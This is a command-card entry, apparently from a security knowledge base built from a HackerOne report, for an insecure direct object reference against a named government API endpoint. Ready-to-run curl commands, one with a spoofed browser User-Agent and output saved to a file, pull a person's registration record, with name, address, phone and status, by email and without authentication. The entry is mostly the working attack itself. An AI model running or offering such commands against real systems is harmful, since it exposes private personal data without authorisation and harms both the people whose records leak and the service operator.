---
id: uuid-curl-email-cmd-1
data: >-
  curl
  "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/"
tags:
  - api
  - fetch
  - email
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.836Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-user-by-email

## Command

```bash
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/"
```

## Description

Retrieves user data using email identifier from the API, exposing full registration details including status without auth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Endpoint with email in path | Yes |

## Examples

### Basic Usage

```bash
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/"
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/" -o email_user.json
```

## Expected Output

JSON object: {"userRegisterId":123,"firstName":"Alex","lastName":"Andrio","address":"...","phone":"...","email":"...","registrationStatus":"Pending"}

## Related

- [[commands/curl-fetch-user-by-id]]
- [[procedures/Access-User-Data-via-Email-Lookup]]
